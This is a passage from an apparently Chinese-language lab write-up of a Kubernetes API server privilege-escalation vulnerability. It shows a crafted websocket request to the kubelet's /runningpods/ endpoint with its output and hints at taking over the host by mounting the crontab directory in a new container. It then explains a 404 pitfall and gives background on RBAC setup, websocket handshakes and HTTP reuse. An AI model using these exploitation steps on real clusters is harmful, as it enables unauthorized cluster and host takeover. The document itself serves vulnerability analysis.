因为我们现在已经获取了K8S最高管理权限，所以我们可以直接调用kubelet的内部接口去查询这些信息，例如发送如下请求来获取正在运行的所有pods的详细信息
    GET /runningpods/ HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Host: 192.168.127.80:6443
    Origin: http://192.168.127.80:6443
    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
    Sec-WebSocket-Version: 13
结果如下
    {"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"test1","namespace":"role","uid":"f99e2d0a-f907-11e8-8fb9-000c290f37a1","creationTimestamp":null},"spec":{"containers":[{"name":"test","image":"sha256:17a5ba3b1216ccac0f8ee54568ba256619160ff4020243884bc3ed86bf8ae737","resources":{}}]},"status":{}},{"metadata":{"name":"test","namespace":"role","uid":"d4779abc-f907-11e8-8fb9-000c290f37a1","creationTimestamp":null},"spec":{"containers":[{"name":"test","image":"sha256:17a5ba3b1216ccac0f8ee54568ba256619160ff4020243884bc3ed86bf8ae737","resources":{}}]},"status":{}},{"metadata":{"name":"istio-sidecar-injector-6bd4d9487c-fgkds","namespace":"istio-system","uid":"c4fdf537-f23f-11e8-b2db-000c290f37a1","creationTimestamp":null},...省略
## 7.5 获取K8S权限后如何获取主机权限
这边不再延伸，有兴趣可以具体尝试，例如可以利用K8S新建一个容器，该容器直接挂载系统关键目录，如crontab配置目录等，然后通过写定时任务等方式获取系统权限。
## 7.6 一个细节
补充一个测试利用过程中的坑，让大家提前了解，避免踩坑。  
测试构造第二个请求是，直接在目标主机192.168.127.80上执行下面命令找一个pod的基础信息来进行攻击（没有直接调用/runningpods查询）
    kubectl get namespace
    kubectl -n kube-system get pods
    kubectl -n kube-system get pods kube-flannel-ds-amd64-48sj8 -o json
如上图所示，查询返回了3个pod，第一次测试时，直接选择了第一个pod kube-flannel-ds-amd64-48sj8，发送第二个报文后，返回信息如下：
    HTTP/1.1 404 Not Found
    Date: Fri, 07 Dec 2018 14:24:49 GMT
    Content-Length: 18
    Content-Type: text/plain; charset=utf-8
    pod does not exist
提示pod不存在，这个就很奇怪了，仔细校验接口调用是对的，也不会有权限问题，现在的权限实际就是apiserver的权限，默认是具有所有权限了，namespace和pod信息是直接查询到的也不会有错，怎么会pod不存在？  
实际原因是这样的，由于我们攻击发送的第一个报文（用来构建一个到kubelet的通道），连接的是role namespace的test
pod，这个pod实际是在节点3而非当前主机节点1（192.168.127.80）上，所以我们的通道直连接的是节点3上的kubelet，因此我们无法直接访问到其它节点上的pod，而上述查询获取到的第一个pod正好是其它节点上的，导致漏洞利用时返回了404。
# 8 相关知识
由于该漏洞涉及K8S、websocket等相关技术细节，下面简单介绍下涉及到的相关知识，辅助理解与分析漏洞。
## 8.1 K8S权限相关
kubernetes 主要通过 APIServer
对外提供服务，对于这样的系统集群来说，请求访问的安全性是非常重要的考虑因素。如果不对请求加以限制，那么会导致请求被滥用，甚至被黑客攻击。  
kubernetes 对于访问 API
来说提供了两个步骤的安全措施：认证和授权。认证解决用户是谁的问题，授权解决用户能做什么的问题。通过合理的权限管理，能够保证系统的安全可靠。  
下图是 API 访问要经过的三个步骤，前面两个是认证和授权，第三个是 Admission
Control，它也能在一定程度上提高安全性，不过更多是资源管理方面的作用。  
注：  
只有通过 HTTPS 访问的时候才会通过认证和授权，HTTP 则不需要鉴权  
认证授权基本概念请参考：
下面以本次测试建立的普通权限用户的过程为例，简单说说明下k8s环境下如何去新建一个普通权限的用户的基本步骤（详情可以参考：
    1、cd /opt/awesome/role/
    2、建一个空间，比如说role
        kubectl create namespace role
    3、创建一个pod
        kubectl create -f test_pod.yaml
    4、创建RBAC规则，给用户组test赋予了list所有namespaces、在namespace role下list/get pods、在namespace role下get pods/exec的权限
        kubectl create -f test_cluster_role.yaml
        kubectl create -f test_cluster_role_binding.yaml
        kubectl create -f test_role.yaml
        kubectl create -f test_role_binding.yaml
    5、创建tokens文件/etc/kubernetes/pki/role-token.csv
    6、令apiserver开启token-auth-file
         在/etc/kubernetes/manifests/kube-apiserver.yaml中加一条--token-auth-file=/etc/kubernetes/pki/role-token.csv
    7、等待apiserver重启，这时候就可以用使用curl测试下权限配置是否生效了，例如
        curl -k  --header "Authorization: Bearer {你配置的token}" https://192.168.127.80:6443/api/v1/namespaces/role/pods以test-role用户来list在namespace role下的pods
相关配置文件
    [root@pegasus01 role]# cat test_cluster_role_binding.yaml
    apiVersion: rbac.authorization.k8s.io/v1
    kind: ClusterRoleBinding
    metadata:
      name: test-role
    roleRef:
      apiGroup: rbac.authorization.k8s.io
      kind: ClusterRole
      name: test-role
    subjects:
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: test
    [root@pegasus01 role]# cat test_cluster_role.yaml
    apiVersion: rbac.authorization.k8s.io/v1
    kind: ClusterRole
    metadata:
      name: test-role
    rules:
    - apiGroups:
      - ""
      resources:
      - namespaces
      verbs:
      - get
      - list
      - watch
    [root@pegasus01 role]# cat test_pod.yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: test
      namespace: role
    spec:
      containers:
      - command:
        - /bin/sh
        - -c
        - sleep 36000000
        image: grafana/grafana:5.2.3
        imagePullPolicy: IfNotPresent
        name: test
        resources:
          requests:
            cpu: 10m
      dnsPolicy: ClusterFirst
      priority: 0
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: default
      serviceAccountName: default
      terminationGracePeriodSeconds: 30
    [root@pegasus01 role]# cat test_role_binding.yaml
    apiVersion: rbac.authorization.k8s.io/v1
    kind: RoleBinding
    metadata:
      name: test-role
      namespace: role
    roleRef:
      apiGroup: rbac.authorization.k8s.io
      kind: Role
      name: test-role
    subjects:
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: test
    [root@pegasus01 role]# cat test_role.yaml
    apiVersion: rbac.authorization.k8s.io/v1
    kind: Role
    metadata:
      name: test-role
      namespace: role
    rules:
    - apiGroups:
      - ""
      resources:
      - configmaps
      verbs:
      - get
      - list
      - delete
    - apiGroups:
      - ""
      resources:
      - pods
      verbs:
      - get
      - list
      - delete
      - watch
    - apiGroups:
      - ""
      resources:
      - pods/exec
      verbs:
      - create
      - get
    [root@pegasus01 role]# cat /etc/kubernetes/pki/role-token.csv
    1234567890,test-role,test-role,test
# 8.2 websocket相关
WebSocket是一种在单个TCP连接上进行全双工通信的协议。所以WebSocket 是独立的、创建在 TCP 上的协议。Websocket 通过
HTTP/1.1
协议的101状态码进行握手。为了创建Websocket连接，需要通过浏览器发出请求，之后服务器进行回应，这个过程通常称为“握手”（handshaking）。  
一个典型的Websocket握手请求如下：  
客户端请求
    GET / HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Host: example.com
    Origin: http://example.com
    Sec-WebSocket-Key: sN9cRrP/n9NdMgdcy2VJFQ==
    Sec-WebSocket-Version: 13
服务器回应
    HTTP/1.1 101 Switching Protocols
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Accept: fFBooB7FAkLlXgRSz0BT3v4hq5s=
    Sec-WebSocket-Location: ws://example.com/
字段说明
    Connection必须设置Upgrade，表示客户端希望连接升级。
    Upgrade字段必须设置Websocket，表示希望升级到Websocket协议。
    Sec-WebSocket-Key是随机的字符串，服务器端会用这些数据来构造出一个SHA-1的信息摘要。把“Sec-WebSocket-Key”加上一个特殊字符串“258EAFA5-E914-47DA-95CA-C5AB0DC85B11”，然后计算SHA-1摘要，之后进行BASE-64编码，将结果做为“Sec-WebSocket-Accept”头的值，返回给客户端。如此操作，可以尽量避免普通HTTP请求被误认为Websocket协议。
    Sec-WebSocket-Version 表示支持的Websocket版本。RFC6455要求使用的版本是13，之前草案的版本均应当弃用。
    Origin字段是可选的，通常用来表示在浏览器中发起此Websocket连接所在的页面，类似于Referer。但是，与Referer不同的是，Origin只包含了协议和主机名称。
    其他一些定义在HTTP协议中的字段，如Cookie等，也可以在Websocket中使用。
## 8.3 TCP连接复用与HTTP复用
TCP连接复用技术通过将前端多个客户的HTTP请求复用到后端与服务器建立的一个TCP连接上。这种技术能够大大减小服务器的性能负载，减少与服务器之间新建TCP连接所带来的延时，并最大限度的降低客户端对后端服务器的并发连接数请求，减少服务器的资源占用。
在HTTP 1.0中，客户端的每一个HTTP请求都必须通过独立的TCP连接进行处理，而在HTTP
1.1中，对这种方式进行了改进。客户端可以在一个TCP连接中发送多个HTTP请求，这种技术叫做HTTP复用（HTTP
Multiplexing）。它与TCP连接复用最根本的区别在于，TCP连接复用是将多个客户端的HTTP请求复用到一个服务器端TCP连接上，而HTTP复用则是一个客户端的多个HTTP请求通过一个TCP连接进行处理。前者是负载均衡设备的独特功能；而后者是HTTP
1.1协议所支持的新功能，目前被大多数浏览器所支持。